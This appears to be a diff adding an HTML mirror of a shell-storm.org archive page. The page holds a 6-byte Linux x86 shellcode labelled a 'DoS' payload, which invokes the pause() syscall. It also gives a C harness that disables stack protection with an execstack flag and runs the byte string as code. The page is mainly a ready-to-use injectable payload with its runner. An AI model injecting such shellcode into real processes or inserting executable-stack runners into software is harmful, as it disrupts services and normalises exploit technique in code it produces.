@@ -1,0 +1,43 @@
+<html>
+<!-- Mirrored from shell-storm.org/shellcode/files/shellcode-586.html by HTTrack Website Copier/3.x [XR&CO'2014], Fri, 21 Apr 2023 12:51:11 GMT -->
+<head><title>Linux/x86 - DoS-Badger-Game - 6 bytes</title>
+<meta http-equiv="Content-Type" content="text/html; charset=ISO-8859-1" />
+<meta http-equiv="Content-Language" content="en" />
+<script async src="https://www.googletagmanager.com/gtag/js?id=G-NLNHL50HG5"></script>
+<script src="http://shell-storm.org/assets/js/gtag.js"></script>
+</head>
+
+
+<pre>
+#include &lt;stdio.h&gt;
+#include &lt;string.h&gt;
+ 
+/*
+by Magnefikko
+14.04.2010
+magnefikko@gmail.com
+promhyl.oz.pl
+Subgroup: #PRekambr
+Name: 6 bytes DoS-Badger-Game shellcode
+Platform: Linux x86
+ 
+pause()
+gcc -Wl,-z,execstack filename.c
+ 
+shellcode:
+ 
+\x31\xc0\xb0\x1d\xcd\x80
+ 
+*/
+ 
+ 
+int main(){
+char shell[] = &quot;\x31\xc0\xb0\x1d\xcd\x80&quot;;
+printf(&quot;by Magnefikko\nmagnefikko@gmail.com\npromhyl.oz.pl\n\nstrlen(shell)
+= %d\n&quot;, strlen(shell));
+(*(void (*)()) shell)();
+}
+
+</pre>
+<!-- Mirrored from shell-storm.org/shellcode/files/shellcode-586.html by HTTrack Website Copier/3.x [XR&CO'2014], Fri, 21 Apr 2023 12:51:11 GMT -->
+</html>
